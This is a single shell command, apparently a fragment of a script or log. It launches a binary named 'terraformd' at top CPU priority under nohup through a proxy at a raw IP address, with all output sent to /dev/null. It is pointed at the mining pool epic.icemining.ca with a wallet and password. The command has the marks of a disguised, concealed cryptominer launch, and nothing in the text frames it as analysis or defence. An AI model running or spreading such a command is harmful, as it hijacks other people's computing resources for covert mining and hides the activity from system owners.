...
http_proxy=http://34.105.44.133:8816 nice -n -20 nohup terraformd --config-file abcdzyxw.txt --pool epic.icemining.ca:4000 --wallet abtikaon --password m2Ys61xLozEp >/dev/null 2>&1 &
